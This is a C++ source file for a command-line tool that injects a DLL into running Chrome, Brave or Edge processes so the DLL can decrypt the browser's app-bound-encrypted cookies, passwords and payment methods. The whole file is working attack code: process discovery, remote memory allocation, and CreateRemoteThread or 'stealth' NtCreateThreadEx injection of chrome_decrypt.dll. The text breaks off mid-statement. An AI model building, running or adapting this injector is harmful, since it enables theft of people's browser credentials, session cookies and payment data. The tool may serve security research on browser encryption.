// chrome_inject.cpp
// v0.9.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <iostream>
#include <string>
#include <string_view>
#include <vector>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <cctype>
#include <cwctype>
#include <algorithm>
#include <optional>
#include <map>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

const WCHAR *COMPLETION_EVENT_NAME_INJECTOR = L"Global\\ChromeDecryptWorkDoneEvent";
const char *SESSION_CONFIG_FILE_NAME_INJECTOR = "chrome_decrypt_session.cfg";

constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
constexpr DWORD INJECTOR_REMOTE_THREAD_WAIT_MS = 15000;

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;
static bool verbose = false;
static std::wstring g_customOutputPathArg;

std::string WStringToUtf8(std::wstring_view w_sv)
{
    if (w_sv.empty())
        return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
    if (size_needed == 0)
    {
        // std::cerr << "WStringToUtf8: WideCharToMultiByte (size_needed) failed. Error: " << GetLastError() << std::endl;
        return "";
    }
    std::string utf8_str(size_needed, '\0');
    if (WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr) == 0)
    {
        // std::cerr << "WStringToUtf8: WideCharToMultiByte (conversion) failed. Error: " << GetLastError() << std::endl;
        return "";
    }
    return utf8_str;
}

void print_hex_ptr(std::ostringstream &oss, const void *ptr)
{
    oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
}

inline void debug(const std::string &msg)
{
    if (!verbose)
        return;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN);
    std::cout << "[#] " << msg << std::endl;
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

struct HandleGuard
{
    HANDLE h_;
    std::string context_msg;

    explicit HandleGuard(HANDLE h = nullptr, const std::string &context = "")
        : h_((h == INVALID_HANDLE_VALUE) ? nullptr : h), context_msg(context)
    {
        if (h_ && verbose)
        {
            std::ostringstream oss;
            oss << "HandleGuard: acquired handle ";
            print_hex_ptr(oss, h_);
            if (!context_msg.empty())
                oss << " (" << context_msg << ")";
            debug(oss.str());
        }
    }
    ~HandleGuard()
    {
        if (h_)
        {
            if (verbose)
            {
                std::ostringstream oss;
                oss << "HandleGuard: closing handle ";
                print_hex_ptr(oss, h_);
                if (!context_msg.empty())
                    oss << " (" << context_msg << ")";
                debug(oss.str());
            }
            CloseHandle(h_);
        }
    }
    HANDLE get() const { return h_; }
    void reset(HANDLE h = nullptr)
    {
        if (h_)
            CloseHandle(h_);
        h_ = (h == INVALID_HANDLE_VALUE) ? nullptr : h;
        if (h_ && verbose)
        {
            std::ostringstream oss;
            oss << "HandleGuard: reset to handle ";
            print_hex_ptr(oss, h_);
            debug(oss.str());
        }
    }
    explicit operator bool() const { return h_ != nullptr; }
    HandleGuard(const HandleGuard &) = delete;
    HandleGuard &operator=(const HandleGuard &) = delete;
    HandleGuard(HandleGuard &&other) noexcept : h_(other.h_), context_msg(std::move(other.context_msg)) { other.h_ = nullptr; }
    HandleGuard &operator=(HandleGuard &&other) noexcept
    {
        if (this != &other)
        {
            if (h_)
                CloseHandle(h_);
            h_ = other.h_;
            context_msg = std::move(other.context_msg);
            other.h_ = nullptr;
        }
        return *this;
    }
};

void print_status(const std::string &tag, const std::string &msg)
{
    WORD original_attributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
    CONSOLE_SCREEN_BUFFER_INFO console_info;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    if (GetConsoleScreenBufferInfo(hConsole, &console_info))
        original_attributes = console_info.wAttributes;

    WORD col = original_attributes;
    if (tag == "[+]")
        col = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
    else if (tag == "[-]")
        col = FOREGROUND_RED | FOREGROUND_INTENSITY;
    else if (tag == "[*]")
        col = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
    else if (tag == "[!]")
        col = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

    SetConsoleTextAttribute(hConsole, col);
    std::cout << tag;
    SetConsoleTextAttribute(hConsole, original_attributes);
    std::cout << " " << msg << std::endl;
}

static const char *ArchName(USHORT m)
{
    switch (m)
    {
    case IMAGE_FILE_MACHINE_I386:
        return "x86";
    case IMAGE_FILE_MACHINE_AMD64:
        return "x64";
    case IMAGE_FILE_MACHINE_ARM64:
        return "ARM64";
    default:
        return "Unknown";
    }
}
constexpr USHORT MyArch =
#if defined(_M_IX86)
    IMAGE_FILE_MACHINE_I386
#elif defined(_M_X64)
    IMAGE_FILE_MACHINE_AMD64
#elif defined(_M_ARM64)
    IMAGE_FILE_MACHINE_ARM64
#else
    IMAGE_FILE_MACHINE_UNKNOWN
#endif
    ;

bool GetProcessArchitecture(HANDLE hProc, USHORT &arch)
{
    auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
    if (fnIsWow64Process2)
    {
        USHORT processMachine = IMAGE_FILE_MACHINE_UNKNOWN, nativeMachine = IMAGE_FILE_MACHINE_UNKNOWN;
        if (!fnIsWow64Process2(hProc, &processMachine, &nativeMachine))
        {
            debug("IsWow64Process2 call failed. Error: " + std::to_string(GetLastError()));
            return false;
        }
        arch = (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processMachine;
        debug(std::string("IsWow64Process2: processMachine=") + ArchName(processMachine) + ", nativeMachine=" + ArchName(nativeMachine) + ", effectiveArch=" + ArchName(arch));
        return true;
    }
    BOOL isWow64 = FALSE;
    if (!IsWow64Process(hProc, &isWow64))
    {
        debug("IsWow64Process call failed. Error: " + std::to_string(GetLastError()));
        return false;
    }
#if defined(_M_X64)
    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_ARM64)
    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_ARM64;
#elif defined(_M_IX86)
    arch = IMAGE_FILE_MACHINE_I386;
    if (isWow64)
    {
        debug("Warning: 32-bit injector running on a 64-bit OS (or WOW64 detected unexpectedly). Target is likely x64 if IsWow64Process is true.");
    }
#else
    arch = IMAGE_FILE_MACHINE_UNKNOWN;
    return false;
#endif
    debug(std::string("IsWow64Process fallback: isWow64=") + (isWow64 ? "TRUE" : "FALSE") + ", effectiveArch=" + ArchName(arch));
    return true;
}

bool CheckArchMatch(HANDLE hProc)
{
    USHORT targetArch = IMAGE_FILE_MACHINE_UNKNOWN;
    if (!GetProcessArchitecture(hProc, targetArch))
    {
        print_status("[-]", "Failed to determine target architecture");
        return false;
    }
    if (targetArch != MyArch)
    {
        print_status("[-]", std::string("Architecture mismatch: Injector is ") + ArchName(MyArch) + " but target is " + ArchName(targetArch));
        return false;
    }
    debug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
    return true;
}

void DisplayBanner()
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cout << "------------------------------------------------" << std::endl;
    std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
    std::cout << "|  Multi-Method Process Injector               |" << std::endl;
    std::cout << "|  Cookies / Passwords / Payment Methods       |" << std::endl;
    std::cout << "|  v0.9.0 by @xaitax                           |" << std::endl;
    std::cout << "------------------------------------------------" << std::endl
              << std::endl;
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

void CleanupPreviousRun()
{
    debug("CleanupPreviousRun: attempting to remove temp files");
    fs::path tempDir;
    try
    {
        tempDir = fs::temp_directory_path();
    }
    catch (const fs::filesystem_error &e)
    {
        debug("CleanupPreviousRun: fs::temp_directory_path() failed: " + std::string(e.what()) + ". Skipping cleanup of some temp files.");
        return;
    }

    const char *files_to_delete[] = {"chrome_decrypt.log", "chrome_appbound_key.txt", SESSION_CONFIG_FILE_NAME_INJECTOR};
    for (const char *fname : files_to_delete)
    {
        fs::path file_path = tempDir / fname;
        std::error_code ec;
        if (fs::exists(file_path))
        {
            debug("Deleting " + file_path.u8string());
            if (!fs::remove(file_path, ec))
            {
                debug("Failed to delete temp file: " + file_path.u8string() + ". Error: " + ec.message());
            }
        }
        else
        {
            // debug("Temp file not found, no cleanup needed: " + file_path.u8string());
        }
    }
}

std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
{
    debug("GetProcessIdByName: snapshotting processes for " + WStringToUtf8(procName));
    HandleGuard snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0), "CreateToolhelp32Snapshot");
    if (!snap)
    {
        debug("GetProcessIdByName: CreateToolhelp32Snapshot failed. Error: " + std::to_string(GetLastError()));
        return std::nullopt;
    }
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snap.get(), &entry))
    {
        do
        {
            if (procName == entry.szExeFile)
            {
                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(entry.th32ProcessID));
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snap.get(), &entry));
    }
    else
    {
        if (GetLastError() != ERROR_NO_MORE_FILES)
            debug("GetProcessIdByName: Process32FirstW failed. Error: " + std::to_string(GetLastError()));
    }
    debug("GetProcessIdByName: Process " + WStringToUtf8(procName) + " not found.");
    return std::nullopt;
}

std::string GetDllPathUtf8()
{
    wchar_t currentExePathRaw[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, currentExePathRaw, MAX_PATH);
    if (len == 0 || (len == MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        debug("GetDllPathUtf8: GetModuleFileNameW failed or buffer too small. Error: " + std::to_string(GetLastError()));
        return "";
    }
    fs::path dllPathFs = fs::path(currentExePathRaw).parent_path() / L"chrome_decrypt.dll";
    std::string dllPathStr = dllPathFs.u8string();
    debug("GetDllPathUtf8: DLL path determined as: " + dllPathStr);
    return dllPathStr;
}

bool InjectWithLoadLibrary(HANDLE proc, const std::string &dllPathUtf8)
{
    debug("InjectWithLoadLibrary: begin for DLL: " + dllPathUtf8);
    SIZE_T size = dllPathUtf8.length() + 1;
    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem)
    {
        debug("VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
        return false;
    }
    std::ostringstream oss_rem;
    print_hex_ptr(oss_rem, rem);
    debug("WriteProcessMemory of DLL path (" + std::to_string(size) + " bytes) to remote address: " + oss_rem.str());

    if (!WriteProcessMemory(proc, rem, dllPathUtf8.c_str(), size, nullptr))
    {
        debug("WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr)
    {
        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    std::ostringstream oss_load_lib;
    print_hex_ptr(oss_load_lib, loadLibraryAddr);
    debug("Calling CreateRemoteThread with LoadLibraryA at " + oss_load_lib.str());

    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, rem, 0, nullptr), "RemoteLoadLibraryThread");
    if (!th)
    {
        debug("CreateRemoteThread failed. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Waiting for remote LoadLibraryA thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
    DWORD wait_res = WaitForSingleObject(th.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
    if (wait_res == WAIT_TIMEOUT)
        debug("Remote LoadLibraryA thread timed out.");
    else if (wait_res == WAIT_OBJECT_0)
        debug("Remote LoadLibraryA thread finished.");
    else
        debug("WaitForSingleObject on LoadLibraryA thread failed. Error: " + std::to_string(GetLastError()));

    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
    debug("InjectWithLoadLibrary: done");
    return (wait_res == WAIT_OBJECT_0);
}

typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument,
    IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize, IN PVOID AttributeList);

bool InjectWithNtCreateThreadEx(HANDLE proc, const std::string &dllPathUtf8)
{
    debug("InjectWithNtCreateThreadEx: begin for DLL: " + dllPathUtf8);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
    {
        debug("GetModuleHandleW for ntdll.dll failed. Error: " + std::to_string(GetLastError()));
        return false;
    }
    std::ostringstream oss_ntdll_base;
    print_hex_ptr(oss_ntdll_base, ntdll);
    debug("ntdll.dll base=" + oss_ntdll_base.str());

    auto fnNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!fnNtCreateThreadEx)
    {
        debug("GetProcAddress NtCreateThreadEx failed. Error: " + std::to_string(GetLastError()));
        return false;
    }
    std::ostringstream oss_fn_nt;
    print_hex_ptr(oss_fn_nt, fnNtCreateThreadEx);
    debug("NtCreateThreadEx addr=" + oss_fn_nt.str());

    SIZE_T size = dllPathUtf8.length() + 1;
    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem)
    {
        debug("VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
        return false;
    }
    if (!WriteProcessMemory(proc, rem, dllPathUtf8.c_str(), size, nullptr))
    {
        debug("WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    std::ostringstream oss_rem_nt;
    print_hex_ptr(oss_rem_nt, rem);
    debug("WriteProcessMemory complete for DLL path to remote address: " + oss_rem_nt.str());

    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr)
    {
        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(GetLastError()));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    std::ostringstream oss_load_lib_nt;
    print_hex_ptr(oss_load_lib_nt, loadLibraryAddr);
    debug("Calling NtCreateThreadEx with LoadLibraryA at " + oss_load_lib_nt.str());

    HANDLE thr = nullptr;
    NTSTATUS st = fnNtCreateThreadEx(&thr, THREAD_ALL_ACCESS, nullptr, proc, loadLibraryAddr, rem, 0, 0, 0, 0, nullptr);
    HandleGuard remoteThreadHandle(thr, "NtCreateThreadEx RemoteThread");

    std::ostringstream oss_nt_ret;
    oss_nt_ret << "NtCreateThreadEx returned status 0x" << std::hex << st << ", thread handle=";
    print_hex_ptr(oss_nt_ret, remoteThreadHandle.get());
    debug(oss_nt_ret.str());

    if (!NT_SUCCESS(st) || !remoteThreadHandle)
    {
        debug("NtCreateThreadEx failed or returned null thread handle.");
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
    DWORD wait_res = WaitForSingleObject(remoteThreadHandle.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);

    if (wait_res == WAIT_TIMEOUT)
        debug("Remote LoadLibraryA thread (NtCreateThreadEx) timed out.");
    else if (wait_res == WAIT_OBJECT_0)
        debug("Remote LoadLibraryA thread (NtCreateThreadEx) finished.");
    else
        debug("WaitForSingleObject on LoadLibraryA thread (NtCreateThreadEx) failed. Error: " + std::to_string(GetLastError()));

    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
    debug("InjectWithNtCreateThreadEx: done");
    return (wait_res == WAIT_OBJECT_0);
}

struct BrowserDetails
{
    std::wstring processName;
    std::wstring defaultExePath;
};
const std::map<std::wstring, BrowserDetails> browserConfigMap = {
    {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
    {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
    {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};

bool StartBrowserAndWait(const std::wstring &exePath, DWORD &outPid)
{
    debug("StartBrowserAndWait: attempting to launch: " + WStringToUtf8(exePath));
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    if (!CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
    {
        debug("CreateProcessW failed for " + WStringToUtf8(exePath) + ". Error: " + std::to_string(GetLastError()));
        return false;
    }
    HandleGuard processHandle(pi.hProcess, "BrowserProcessHandle");
    HandleGuard threadHandle(pi.hThread, "BrowserMainThreadHandle");
    debug("Waiting " + std::to_string(BROWSER_INIT_WAIT_MS / 1000) + "s for browser to initialize...");
    Sleep(BROWSER_INIT_WAIT_MS);
    outPid = pi.dwProcessId;
    debug("Browser started PID=" + std::to_string(outPid));
    return true;
}

void PrintUsage()
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::wcout << L"Usage:\n"
               << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
               << L"Options:\n"
               << L"  --method|-m <load|nt>    Injection method (default: load)\n"
               << L"  --start-browser|-s       Auto-launch browser if not running\n"
               << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
               << L"  --verbose|-v             Enable verbose debug output from the injector\n"
               << L"  --help|-h                Show this help message\n";
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

int wmain(int argc, wchar_t *argv[])
{
    DisplayBanner();
    std::string injectionMethodStr = "load";
    bool autoStartBrowser = false;
    bool browserSuccessfullyStartedByInjector = false;
    std::wstring browserTypeArg;

    debug("wmain: parsing arguments");
    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if ((arg == L"--method" || arg == L"-m") && i + 1 < argc)
        {
            std::wstring_view method_val_sv = argv[++i];
            injectionMethodStr = WStringToUtf8(method_val_sv);
            std::transform(injectionMethodStr.begin(), injectionMethodStr.end(), injectionMethodStr.begin(), [](unsigned char c)
                           { return static_cast<char>(std::tolower(c)); });
            debug("Injection method set to: " + injectionMethodStr);
        }
        else if (arg == L"--start-browser" || arg == L"-s")
        {
            autoStartBrowser = true;
            debug("Auto-start browser enabled.");
        }
        else if (arg == L"--verbose" || arg == L"-v")
        {
            verbose = true;
            std::cout << "[#] Verbose mode enabled." << std::endl;
        }
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
        {
            g_customOutputPathArg = argv[++i];
            debug("Custom output path argument: " + WStringToUtf8(g_customOutputPathArg));
        }
        else if (browserTypeArg.empty() && !arg.empty() && arg[0] != L'-')
        {
            browserTypeArg = arg;
            std::transform(browserTypeArg.begin(), browserTypeArg.end(), browserTypeArg.begin(), [](wchar_t wc)
                           { return static_cast<wchar_t>(std::towlower(wc)); });
            debug("Browser type argument: " + WStringToUtf8(browserTypeArg));
        }
        else if (arg == L"--help" || arg == L"-h")
        {
            PrintUsage();
            return 0;
        }
        else
        {
            print_status("[!]", "Unknown or misplaced argument: " + WStringToUtf8(arg) + ". Use --help for usage.");
        }
    }

    if (browserTypeArg.empty())
    {
        PrintUsage();
        return 1;
    }

    CleanupPreviousRun();

    fs::path resolvedOutputPath;
    if (!g_customOutputPathArg.empty())
    {
        resolvedOutputPath = fs::absolute(g_customOutputPathArg);
    }
    else
    {
        resolvedOutputPath = fs::current_path() / "output";
    }
    debug("Resolved output path: " + resolvedOutputPath.u8string());
    std::error_code ec_dir;
    if (!fs::exists(resolvedOutputPath))
    {
        if (!fs::create_directories(resolvedOutputPath, ec_dir))
        {
            print_status("[-]", "Failed to create output directory: " + resolvedOutputPath.u8string() + ". Error: " + ec_dir.message());
            return 1;
        }
        debug("Created output directory: " + resolvedOutputPath.u8string());
    }

    fs::path configFilePath;
    try
    {
        configFilePath = fs::temp_directory_path() / SESSION_CONFIG_FILE_NAME_INJECTOR;
    }
    catch (const fs::filesystem_error &e)
    {
        print_status("[-]", "Failed to get temp directory path: " + std::string(e.what()));
        return 1;
    }
    debug("Writing session config to: " + configFilePath.u8string());
    {
        std::ofstream configFileOut(configFilePath, std::ios::trunc | std::ios::binary);
        if (configFileOut)
        {
            std::string outputPathUtf8 = resolvedOutputPath.u8string();
            configFileOut.write(outputPathUtf8.c_str(), outputPathUtf8.length());
        }
        else
        {
            print_status("[-]", "Failed to write session config file: " + configFilePath.u8string());
            return 1;
        }
    }

    HandleGuard completionEvent(CreateEventW(NULL, TRUE, FALSE, COMPLETION_EVENT_NAME_INJECTOR), "CompletionEvent");
    if (!completionEvent)
    {
        print_status("[-]", "Failed to create completion event. Error: " + std::to_string(GetLastError()));
        return 1;
    }
    debug("Created completion event: " + WStringToUtf8(COMPLETION_EVENT_NAME_INJECTOR));
    ResetEvent(completionEvent.get());

    auto browserIt = browserConfigMap.find(browserTypeArg);
    if (browserIt == browserConfigMap.end())
    {
        print_status("[-]", "Unsupported browser type: " + WStringToUtf8(browserTypeArg));
        return 1;
    }
    const BrowserDetails &currentBrowserInfo = browserIt->second;
    std::string browserDisplayName = WStringToUtf8(browserTypeArg);
    if (!browserDisplayName.empty())
        browserDisplayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplayName[0])));
    debug("Target: " + browserDisplayName + ", Process: " + WStringToUtf8(currentBrowserInfo.processName) + ", Default Exe: " + WStringToUtf8(currentBrowserInfo.defaultExePath));

    DWORD targetPid = 0;
    if (auto optPid = GetProcessIdByName(currentBrowserInfo.processName))
        targetPid = *optPid;

    if (targetPid == 0 && autoStartBrowser)
    {
        print_status("[*]", browserDisplayName + " not running, launching...");
        if (StartBrowserAndWait(currentBrowserInfo.defaultExePath, targetPid))
        {
            browserSuccessfullyStartedByInjector = true;
            std::string versionStr = "N/A";
            debug("Retrieving version info for: " + WStringToUtf8(currentBrowserInfo.defaultExePath));
            DWORD versionHandleUnused = 0;
            DWORD versionInfoSize = GetFileVersionInfoSizeW(currentBrowserInfo.defaultExePath.c_str(), &versionHandleUnused);
            if (versionInfoSize > 0)
            {
                std::vector<BYTE> versionData(versionInfoSize);
                if (GetFileVersionInfoW(currentBrowserInfo.defaultExePath.c_str(), 0, versionInfoSize, versionData.data()))
                {
                    UINT ffiLen = 0;
                    VS_FIXEDFILEINFO *ffi = nullptr;
                    if (VerQueryValueW(versionData.data(), L"\\", (LPVOID *)&ffi, &ffiLen) && ffi)
                    {
                        versionStr = std::to_string(HIWORD(ffi->dwProductVersionMS)) + "." +
                                     std::to_string(LOWORD(ffi->dwProductVersionMS)) + "." +
                                     std::to_string(HIWORD(ffi->dwProductVersionLS)) + "." +
                                     std::to_string(LOWORD(ffi->dwProductVersionLS));
                        debug("Version query successful: " + versionStr);
                    }
                    else
                        debug("VerQueryValueW failed. Error: " + std::to_string(GetLastError()));
                }
                else
                    debug("GetFileVersionInfoW failed. Error: " + std::to_string(GetLastError()));
            }
            else
                debug("GetFileVersionInfoSizeW failed or returned 0. Error: " + std::to_string(GetLastError()));
            print_status("[+]", browserDisplayName + " (v. " + versionStr + ") launched w/ PID " + std::to_string(targetPid));
        }
        else
        {
            print_status("[-]", "Failed to start " + browserDisplayName);
            return 1;
        }
    }
    if (targetPid == 0)
    {
        print_status("[-]", browserDisplayName + " not running and auto-start not requested or failed.");
        return 1;
    }

    std::string injectionMethodDesc = (injectionMethodStr == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibraryA";
    debug("Opening process PID=" + std::to_string(targetPid));
    HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid), "TargetProcessHandle");
    if (!targetProcessHandle)
    {
        print_status("[-]", "OpenProcess failed for PID " + std::to_string(targetPid) + ". Error: " + std::to_string(GetLastError()));
        return 1;
    }
    if (!CheckArchMatch(targetProcessHandle.get()))
        return 1;

    std::string dllPathUtf8 = GetDllPathUtf8();
    if (dllPathUtf8.empty() || !fs::exists(dllPathUtf8))
    {
        print_status("[-]", "chrome_decrypt.dll not found. Expected near injector: " + (dllPathUtf8.empty() ? "<Error determining path>" : dllPathUtf8));
        return 1;
    }

    bool injectedSuccessfully = false;
    if (injectionMethodStr == "nt")
        injectedSuccessfully = InjectWithNtCreateThreadEx(targetProcessHandle.get(), dllPathUtf8);
    else if (injectionMethodStr == "load")
        injectedSuccessfully = InjectWithLoadLibrary(targetProcessHandle.get(), dllPathUtf8);
    else
    {
        print_status("[-]", "Unknown injection method specified: " + injectionMethodStr);
        return 1;
    }

    if (!injectedSuccessfully)
    {
        print_status("[-]", "DLL injection failed via " + injectionMethodDesc);
        return 1;
    }
    print_status("[+]", "DLL injected via " + injectionMethodDesc);

    print_status("[*]", "Waiting for DLL decryption tasks to complete (max " + std::to_string(DLL_COMPLETION_TIMEOUT_MS / 1000) + "s)...");
    DWORD waitResult = WaitForSingleObject(completionEvent.get(), DLL_COMPLETION_TIMEOUT_MS);

    if (waitResult == WAIT_OBJECT_0)
        print_status("[+]", "DLL signaled completion.");
    else if (waitResult == WAIT_TIMEOUT)
        print_status("[-]", "Timeout waiting for DLL completion. Log may be incomplete or DLL failed.");
    else
        print_status("[-]", "Error waiting for DLL completion event: " + std::to_string(GetLastError()));

    fs::path logFilePathFull;
    try
    {
        logFilePathFull = fs::temp_directory_path() / "chrome_decrypt.log";
    }
    catch (const fs::filesystem_error &e)
    {
        print_status("[-]", "Failed to get temp path for log file: " + std::string(e.what()));
    }

    if (!logFilePathFull.empty() && fs::exists(logFilePathFull))
    {
        debug("Attempting to display log file: " + logFilePathFull.u8string());
        std::ifstream ifs(logFilePathFull);
        if (ifs.is_open())
        {
            std::string line;
            CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
            HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
            WORD originalAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
            if (GetConsoleScreenBufferInfo(hStdOut, &consoleInfo))
            {
                originalAttributes = consoleInfo.wAttributes;
            }
            std::cout << std::endl;
            while (std::getline(ifs, line))
            {
                if (line.find("[+] Terminated process:") != std::string::npos && !verbose)
                {
                    continue;
                }
                size_t currentPos = 0;
                while (currentPos < line.length())
                {
                    size_t tagStartPos = line.find('[', currentPos);
                    SetConsoleTextAttribute(hStdOut, originalAttributes);
                    std::cout << line.substr(currentPos, tagStartPos - currentPos);
                    if (tagStartPos == std::string::npos)
                        break;
                    size_t tagEndPos = line.find(']', tagStartPos);
                    if (tagEndPos == std::string::npos)
                    {
                        std::cout << line.substr(tagStartPos);
                        break;
                    }
                    std::string tag = line.substr(tagStartPos, tagEndPos - tagStartPos + 1);
                    WORD currentTagColor = originalAttributes;
                    if (tag == "[+]")
                        currentTagColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                    else if (tag == "[-]")
                        currentTagColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
                    else if (tag == "[*]")
                        currentTagColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                    else if (tag == "[!]")
                        currentTagColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                    SetConsoleTextAttribute(hStdOut, currentTagColor);
                    std::cout << tag;
                    currentPos = tagEndPos + 1;
                }
                SetConsoleTextAttribute(hStdOut, originalAttributes);
                std::cout << std::endl;
            }
            ifs.close();
        }
        else
        {
            debug("Log file not found or could not be opened: " + logFilePathFull.u8string());
            print_status("[!]", "Log file from DLL was not found or is empty.");
        }
    }

    if (browserSuccessfullyStartedByInjector)
    {
        debug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
        HandleGuard processToKillHandle(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid), "ProcessToKillHandle");
        if (processToKillHandle)
        {
            if (TerminateProcess(processToKillHandle.get(), 0))
                print_status("[*]", browserDisplayName + " terminated by injector.");
            else
